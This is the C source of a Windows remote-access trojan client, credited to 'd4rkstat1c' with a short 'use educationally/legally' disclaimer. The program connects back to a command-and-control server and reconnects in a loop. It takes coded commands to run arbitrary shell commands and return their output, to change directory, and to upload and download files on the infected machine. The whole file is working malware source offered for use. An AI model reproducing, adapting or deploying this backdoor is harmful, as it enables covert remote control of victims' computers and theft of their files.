/*
Coded by d4rkstat1c.
Use educationally/legally.
*/
#include <ws2tcpip.h>
#include <stdint.h>
#include <direct.h>
#include <errno.h>
#include "lib/headers/nbo_encoding.h"
#include "lib/headers/sakito_core_funcs.h"

#define HOST "127.0.0.1"
#define PORT 4443

#define BUFLEN 8192

#pragma comment(lib, "Ws2_32.lib")

// Function to create connect socket.
const SOCKET create_socket() 
{
	// Initialize winsock
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);

	if (WSAStartup(ver, &wsData) != 0)
		return INVALID_SOCKET;

	// Create socket.
	const SOCKET connect_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

	if (connect_socket == INVALID_SOCKET)
		WSACleanup();

	return connect_socket;
}

// Function to connect the connect socket to c2 server.
int c2_connect(const SOCKET connect_socket) 
{
	// Create sockaddr_in structure.
	struct sockaddr_in s_in;
	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = inet_addr(HOST);
	s_in.sin_port = htons(PORT);

	// Connect to server hosting c2 service
	if (connect(connect_socket, (SOCKADDR*)&s_in, sizeof(s_in)) == SOCKET_ERROR) 
	{
		closesocket(connect_socket);
		return SOCKET_ERROR;
	}

	return SUCCESS;
}

int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) 
{
	DWORD bytes_read; 
	while (1) 
	{
		// Read stdout, stderr bytes from pipe.
		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);

		// Serialize chunk size bytes (for endianness).
		uint16_t chunk_size_nbytes = htons((uint16_t)bytes_read); 

		// Send serialized chunk size uint16 bytes to server.
		if (send(connect_socket, (char*)&chunk_size_nbytes, sizeof(uint16_t), 0) < 1)
			return SOCKET_ERROR;

		// If we've reached the end of the child's stdout, stderr.
		if (bytes_read == 0)
			break;

		// Send output to server.
		if (send(connect_socket, buf, bytes_read, 0) < 1)
			return SOCKET_ERROR;
	}

	return SUCCESS;
}

// Function to execute command.
int exec_cmd(const SOCKET connect_socket, char* const buf) 
{
	HANDLE child_stdout_read;
	HANDLE child_stdout_write;

	SECURITY_ATTRIBUTES saAttr;  
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;

	// Create a pipe for the child process' STDOUT.
	if ((!CreatePipe(&child_stdout_read, &child_stdout_write, &saAttr, 0))

	// Ensure the read handle is not inherited.
	|| (!SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0))

	// Execute command via CreateProcess.
	|| (!s_win_cp(child_stdout_write, buf)))
		return FAILURE;

	// Send read bytes from pipe (stdout, stderr) to the c2 server.
	return send_pipe_output(child_stdout_read, buf, connect_socket);
}

// Client change directory function.
int ch_dir(char* const dir, const SOCKET connect_socket) 
{
	// '1' = success.
	char chdir_result[] = "1";
	_chdir(dir);

	// If an error occurs.
	if (errno == ENOENT) 
	{
		// '0' = failure.
		chdir_result[0] = '0';
		errno = 0;
	}

	// Send change directory result to server.
	if (send(connect_socket, chdir_result, 1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int send_file(const SOCKET connect_socket, char* const buf) 
{
	// Default f_size value = -1
	uint64_t f_size = FAILURE;

	// Open file with read permissions.
	HANDLE h_file = s_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);

	// If File Exists.
	if (h_file != INVALID_HANDLE_VALUE) 
		f_size = s_win_fsize(h_file);

	// Send read file bytes to server.
	if (s_win_sendf(connect_socket, h_file, buf, f_size) < 1)
		return SOCKET_ERROR;

	// Receive file transfer finished byte.
	if (recv(connect_socket, buf, 1, 0) < 1)
		return SOCKET_ERROR;

	// Close the file.
	CloseHandle(h_file);

	return SUCCESS;
}

// Function to receive file from client (TCP file transfer).
int recv_file(const SOCKET connect_socket, char* const buf) 
{
	// Open file.
	HANDLE h_file = s_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);

	// Send file transfer start byte.
	if (send(connect_socket, FTRANSFER_START, 1, 0) < 1)
		return SOCKET_ERROR;

	// Receive file size.
	if (recv(connect_socket, buf, sizeof(uint64_t), 0) != sizeof(uint64_t))
		return SOCKET_ERROR;

	// Deserialize f_size.
	uint64_t f_size = s_ntohll_conv(buf);

	// Initialize i_result to true/1.
	int i_result = SUCCESS;

	// If file exists.
	if (f_size > 0)
		// Windows TCP file transfer (recv) function located in sakito_swin_tools.h.
		i_result = s_win_recvf(connect_socket, h_file, buf, f_size);

	// Close the file.
	CloseHandle(h_file);

	return i_result;
}

int send_cwd(char* const buf, const SOCKET connect_socket) 
{
	// Store working directory in buf.
	GetCurrentDirectory(BUFLEN, buf);

	// Send current working directory to c2 server.
	if (send(connect_socket, buf, strlen(buf)+1, 0) < 1)
		return SOCKET_ERROR;

	return SUCCESS;
}

// Main function for connecting to c2 server & parsing c2 commands.
int main(void) 
{
	while (1) 
	{
		// Create the connect socket.
		const SOCKET connect_socket = create_socket();

		/* 
		If connected to c2 recursively loop to receive/parse c2 command codes. If an error-
		occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
		statement will parse & execute functions based on the order of probability.
		*/
		if (connect_socket != INVALID_SOCKET) 
		{
			int i_result = c2_connect(connect_socket);

			if (i_result) 
			{
				// 8192 == Max command line command length in windows + 1 for null termination.
				char buf[BUFLEN+1] = { 0 };

				_init: // Receive initialization byte.
				i_result = recv(connect_socket, buf, 1, 0);
				
				while (i_result > 0) 
				{
					// Send current working directory to server.
					if (send_cwd(buf, connect_socket) < 1)
						break;

					// Set all bytes in buffer to zero.
					memset(buf, '\0', BUFLEN);

					// Receive command + parsed data.
					if (recv(connect_socket, buf, BUFLEN, 0) < 1)
						break;

					// *buf is the command code and buf+1 is pointing to the parsed data.
					switch (*buf)
					{
						case '0':
							i_result = exec_cmd(connect_socket, buf+1);
							break;
						case '1':
							// Change directory.
							i_result = ch_dir(buf+1, connect_socket);
							break;
						case '2':
							// Exit.
							return EXIT_SUCCESS;
						case '3':
							// Upload file to client system.
							i_result = recv_file(connect_socket, buf);
							break;
						case '4':
							// Download file from client system.
							i_result = send_file(connect_socket, buf);
							break;
						case '5':
							// Reinitiate connection (backgrounded).
							goto _init;
						case '6':
							// Server-side error occurred re-receive command.
							i_result = 0;
							break;
					}
				}
			}
		}

		// If unable to connect or an error occurs sleep 8 seconds.
		Sleep(8000);
	}

	return FAILURE;
}
